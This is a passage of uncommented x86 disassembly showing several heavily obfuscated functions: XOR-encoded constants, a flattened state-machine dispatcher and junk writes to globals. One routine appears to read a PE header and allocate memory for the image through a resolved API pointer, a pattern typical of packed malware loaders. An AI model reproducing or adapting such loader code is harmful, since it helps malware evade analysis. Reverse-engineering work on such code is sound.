  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
